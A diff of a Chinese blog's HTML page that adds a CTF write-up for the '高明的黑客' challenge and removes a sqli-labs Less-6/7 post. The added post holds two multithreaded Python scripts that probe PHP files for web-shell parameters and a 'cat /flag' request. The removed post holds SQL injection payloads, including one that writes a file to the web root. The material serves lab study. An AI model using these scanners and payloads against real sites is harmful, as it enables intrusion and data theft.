@@ -169,6 +169,189 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-daima" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/04/05/daima/" class="article-date">
+  	<time datetime="2021-04-05T07:08:52.000Z" itemprop="datePublished">2021-04-05</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/05/daima/">
+        buu练习[强网杯 2019]高明的黑客
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>打开题目链接，如下：<br><img src="/2021/04/05/daima/2.png"><br>下载文件：<br><img src="/2021/04/05/daima/1.png"><br>好家伙，这么多个文件，一个一个看完我代码审计应该也就没啥问题了=|=|| <img src="/2021/04/05/daima/3.jpg"><br>这么多的文件其实就是根据一句话木🐎的原理，在大批量的文件中找到你最中意的那个PHP预定义变量$_GET或者$_POST.<br>emmm我无能了，查看大佬的wp，人家是这样正则的：<br><code>get:$_GET[\‘(\w+)\‘]</code><br><code>post:$_POST[\‘(\w+)\‘]</code><br>flag.txt存对应的php和参数信息<br>人家的代码是这样的：</p>
+<pre><code class="prism language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+<span class="token keyword">import</span> threading
+<span class="token keyword">import</span> time
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;开始时间&#xff1a;  &#39;</span><span class="token operator">&#43;</span>  time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
+s1<span class="token operator">&#61;</span>threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>                                            <span class="token comment">#这儿设置最大的线程数</span>
+filePath <span class="token operator">&#61;</span> r<span class="token string">&#34;D:/soft/phpstudy/PHPTutorial/WWW/src/&#34;</span>
+os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>                                                    <span class="token comment">#改变当前的路径</span>
+requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">&#61;</span> <span class="token number">5</span>                                <span class="token comment">#设置重连次数&#xff0c;防止线程数过高&#xff0c;断开连接</span>
+files <span class="token operator">&#61;</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>
+session <span class="token operator">&#61;</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+session<span class="token punctuation">.</span>keep_alive <span class="token operator">&#61;</span> <span class="token boolean">False</span>                                             <span class="token comment"># 设置连接活跃状态为False</span>
+<span class="token keyword">def</span> <span class="token function">get_content</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    s1<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;trying   &#39;</span><span class="token operator">&#43;</span><span class="token builtin">file</span><span class="token operator">&#43;</span> <span class="token string">&#39;     &#39;</span><span class="token operator">&#43;</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span>encoding<span class="token operator">&#61;</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                            <span class="token comment">#打开php文件&#xff0c;提取所有的$_GET和$_POST的参数</span>
+            gets <span class="token operator">&#61;</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            posts <span class="token operator">&#61;</span> <span class="token builtin">list</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    data <span class="token operator">&#61;</span> <span class="token punctuation">&#123;<!-- --></span><span class="token punctuation">&#125;</span>                                                        <span class="token comment">#所有的$_POST</span>
+    params <span class="token operator">&#61;</span> <span class="token punctuation">&#123;<!-- --></span><span class="token punctuation">&#125;</span>                                                        <span class="token comment">#所有的$_GET</span>
+    <span class="token keyword">for</span> m <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
+        params<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">&#61;</span> <span class="token string">&#34;echo &#39;xxxxxx&#39;;&#34;</span>
+    <span class="token keyword">for</span> n <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
+        data<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">&#61;</span> <span class="token string">&#34;echo &#39;xxxxxx&#39;;&#34;</span>
+    url <span class="token operator">&#61;</span> <span class="token string">&#39;http://127.0.0.1/src/&#39;</span><span class="token operator">&#43;</span><span class="token builtin">file</span>
+    req <span class="token operator">&#61;</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">&#61;</span>data<span class="token punctuation">,</span> params<span class="token operator">&#61;</span>params<span class="token punctuation">)</span>            <span class="token comment">#一次性请求所有的GET和POST</span>
+    req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                <span class="token comment"># 关闭请求  释放内存</span>
+    req<span class="token punctuation">.</span>encoding <span class="token operator">&#61;</span> <span class="token string">&#39;utf-8&#39;</span>
+    content <span class="token operator">&#61;</span> req<span class="token punctuation">.</span>text
+    <span class="token comment">#print(content)</span>
+    <span class="token keyword">if</span> <span class="token string">&#34;xxxxxx&#34;</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>                                    <span class="token comment">#如果发现有可以利用的参数&#xff0c;继续筛选出具体的参数</span>
+        flag <span class="token operator">&#61;</span> <span class="token number">0</span>
+        <span class="token keyword">for</span> a <span class="token keyword">in</span> gets<span class="token punctuation">:</span>
+            req <span class="token operator">&#61;</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">&#43;</span><span class="token string">&#39;?%s&#61;&#39;</span><span class="token operator">%</span>a<span class="token operator">&#43;</span><span class="token string">&#34;echo &#39;xxxxxx&#39;;&#34;</span><span class="token punctuation">)</span>
+            content <span class="token operator">&#61;</span> req<span class="token punctuation">.</span>text
+            req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                <span class="token comment"># 关闭请求  释放内存</span>
+            <span class="token keyword">if</span> <span class="token string">&#34;xxxxxx&#34;</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
+                flag <span class="token operator">&#61;</span> <span class="token number">1</span>
+                <span class="token keyword">break</span>
+        <span class="token keyword">if</span> flag <span class="token operator">!&#61;</span> <span class="token number">1</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> b <span class="token keyword">in</span> posts<span class="token punctuation">:</span>
+                req <span class="token operator">&#61;</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">&#61;</span><span class="token punctuation">&#123;<!-- --></span>b<span class="token punctuation">:</span><span class="token string">&#34;echo &#39;xxxxxx&#39;;&#34;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+                content <span class="token operator">&#61;</span> req<span class="token punctuation">.</span>text
+                req<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                <span class="token comment"># 关闭请求  释放内存</span>
+                <span class="token keyword">if</span> <span class="token string">&#34;xxxxxx&#34;</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
+                    <span class="token keyword">break</span>
+        <span class="token keyword">if</span> flag <span class="token operator">&#61;&#61;</span> <span class="token number">1</span><span class="token punctuation">:</span>                                                    <span class="token comment">#flag用来判断参数是GET还是POST&#xff0c;如果是GET&#xff0c;flag&#61;&#61;1&#xff0c;则b未定义&#xff1b;如果是POST&#xff0c;flag为0&#xff0c;</span>
+            param <span class="token operator">&#61;</span> a
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            param <span class="token operator">&#61;</span> b
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;找到了利用文件&#xff1a; &#39;</span><span class="token operator">&#43;</span><span class="token builtin">file</span><span class="token operator">&#43;</span><span class="token string">&#34;  and 找到了利用的参数&#xff1a;%s&#34;</span> <span class="token operator">%</span>param<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;结束时间&#xff1a;  &#39;</span> <span class="token operator">&#43;</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    s1<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>                                                            <span class="token comment">#加入多线程</span>
+   t <span class="token operator">&#61;</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">&#61;</span>get_content<span class="token punctuation">,</span> args<span class="token operator">&#61;</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+   t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre> 
+<p>emmmmm 其实看半天也没看出个所以然，这个脚本大概四分钟便可以找到参数的利用点，主要是因为这个脚本很巧妙的将所有参数一起传入进去，如果发现可以利用再细分找具体的参数。下去再研究研究<br>对于这道题，也可以采用如下代码：</p>
+<pre><code class="language-python">import requests
+import os
+import re
+import threading
+import time
+
+requests.adapters.DEFAULT_RETRIES = 8 #设置重连次数，防止线程数过高，断开连接
+session = requests.Session()
+session.keep_alive = False # 设置连接活跃状态为False
+sem=threading.Semaphore(30) # 设置最大线程数 ,别设置太大，不然还是会崩的挺厉害的，跑到关键的爆炸，心态就爆炸了
+
+url = &quot;http://7cfcd16d-dd76-4421-8906-b9c234c18daf.node3.buuoj.cn/&quot;
+
+# 下载的源文件路径,根据自己的路径修改
+path = r&quot;C:\Users\lenovo\Desktop\www\src\\&quot;
+
+
+rrGET = re.compile(r&quot;\$_GET\[\‘(\w+)\‘\]&quot;) #匹配get参数
+
+rrPOST = re.compile(r&quot;\$_POST\[\‘(\w+)\‘\]&quot;) #匹配post参数
+
+fileNames = os.listdir(path) # 列出目录中的文件,以每个文件都开一个线程
+
+flags = [] #用于存所有的注入点信息,下面的flag表示注入点的信息，php文件名和参数名
+
+local_file = open(&quot;flag.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)
+
+def run(fileName):
+    with sem:
+        file = open( path + fileName, ‘r‘,encoding=‘utf-8‘ )
+        content = file.read()
+        print(&quot;[+]checking:%s&quot; % fileName )
+
+        #测试get的参数
+        for i in rrGET.findall(content):
+            r = session.get( url + &quot;%s?%s=%s&quot; % (fileName,i,&quot;echo h3zh1;&quot;) )
+            if &quot;h3zh1&quot; in r.text:
+                flag = &quot;You Find it in GET fileName = %s and param = %s \n&quot; % ( fileName, i )
+                print(flag)
+                local_file.write(flag)
+                #return 
+
+        #测试post的参数
+        #for i in rrPOST.findall(content):
+        #    r = session.post( url + fileName , data = &#123; i : &quot;echo h3zh1;&quot; &#125; )
+        #    if &quot;h3zh1&quot; in r.text:
+        #        flag = &quot;You Find it in POST: fileName = %s and param = %s \n&quot; % ( fileName, i )
+        #        print(flag)
+        #        local_file.writelines(flag)
+
+if __name__ == ‘__main__‘:
+    start_time = time.time() # 开始时间
+    print(&quot;[start]程序开始:&quot;+str(start_time))
+
+    thread_list = []
+    for fileName in fileNames:
+        t = threading.Thread( target=run , args=(fileName,) )
+        thread_list.append(t)
+    for t in thread_list:
+        t.start()
+    for t in thread_list:
+        t.join()
+
+    end_time = time.time()
+    local_file.close() #关文件
+    print(&quot;[end]程序结束:用时:&quot;+str(end_time-start_time))
+</code></pre>
+<p>然后就可以知道：<br><img src="/2021/04/05/daima/4.png"><br>访问<br><code>url+/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</code><br>就可以得到flag.<br><img src="/2021/04/05/daima/6.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-b" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1160,100 +1343,6 @@ object:o:strlen(object name):object name:object size:{s:strlen(property name):pr
 </li></ul>
 
 <p>接下来和第九关步骤一样，得到想要的内容</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-bc" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/02/22/bc/" class="article-date">
-  	<time datetime="2021-02-22T05:11:15.000Z" itemprop="datePublished">2021-02-22</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/22/bc/">
-        sqli-labs靶场6-7
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1>知识点</h1>
-<h3>outfile语句</h3>
-
-<p>这里需要注意的是outfile语句在MySql中，into outfile函数的权限是很容易忽略的一个点，其中涉及到了几个关键的变量，分别是secure_file_priv, datadir 和 PrivateTmp。下面简单介绍一下这三个变量。<br>（1）secure_file_priv<br>这个参数主要用来限制数据的导入导出效果（load data, into outfile等）。如果这个参数值为NULL，那么mysql会禁止用户进行导入导出操作；如果这个参数是一个具体的目录名，那么数据的导入导出只能在该目录下进行；如果这个参数为空，那么导入导出的文件位置将不受限制。<br>该参数的设置，可以在my.cnf配置文件中修改，而在搭建的SQLi-Labs环境中下需要在配置的phpstudy环境中修改，具体修改方法因配置环境而异，此处不作讲解。<br>（2）datadir<br>这个参数是MySql存放数据文件的目录，也是导入导出操作的相对路径<br>（3）PrivateTmp<br>使用Systemd进程作为启动进程的linux系统，其子进程都会有一个属性叫PrivateTmp，用于设置是否使用私有的tmp目录。</p>
-<h1>Less-6</h1>
-<h3>界面</h3>
-
-<p><img src="/2021/02/22/bc/b1.png"></p>
-<h3>测试</h3>
-
-<p>通过测试可知：?id=1”<br><img src="/2021/02/22/bc/b2.png"></p>
-<ul>
-<li>url + ?id=1" order by 4--+ //报错
-</li></ul>
-
-<p><img src="/2021/02/22/bc/b3.png"><br>可知字段数为3，页面有布尔类型状态，所以用布尔盲注，页面没有回显不能用联合查询，页面没有报错信息不能用报错注入。<br>其余步骤和第五关的一模一样，只是将单引号变为双引号<br>最终payload：?id=1” and extractvalue(1,concat(0x23,(select username from users order by id limit 2,1),0x23))–+<br>得到所有数据：<br><img src="/2021/02/22/bc/b4.png"></p>
-<h1>Less-7</h1>
-<h3>界面</h3>
-
-<p><img src="/2021/02/22/bc/c1.png"></p>
-<h3>测试</h3>
-
-<p>首先，按照提示输入id参数，尝试寻找注入点<br>构建url: …/Less-7/?id=1<br><img src="/2021/02/22/bc/c2.png"><br>页面显示正常，提示使用outfile语句<br>构建url：…/Less-7/?id=1’<br><img src="/2021/02/22/bc/c3.png"><br>页面报错，但是没有提示报错信息,网站存在注入点,通过不断尝试，我们猜测到了原有sql语句的闭合方式<br>构建url：…/Less-7/?id=1’)) –+<br>页面显示正常<br>那么可以使用union联合查询构造语句：</p>
-<ul>
-<li>../Less-7/?id=1")) union select 1,2,3 --(( "
-</li></ul>
-
-<p>此时的查询语句；select * from users where id=((‘1’)) union select 1,2,3 –(( ‘)<br>在linux中，网站一般是放在/var/www/html目录里，这里我们dump一个文件到这个目录，名字是hacker.txt。<br>构造语句：</p>
-<ul>
-<li>../Less-7/?id=1')) union select 1,'hacker by xuxinhen',3 into outfile '/var/www/html/hacker.txt' -- (( '
-</li></ul>
-
-<p><img src="/2021/02/22/bc/c4.png"><br>虽然报错，但是文件已经生成</p>
-<p>打开链接：</p>
-<p>…/hacker.txt即可找到</p>
-<p>此时的sql语句为：</p>
-<ul>
-<li>select * from users where id=(('1')) union select 1,'hacker by xuxinhen',3 into outfile '/var/www/html/hacker.txt' -- (( '
-</li></ul>
-
 
       
     </div>
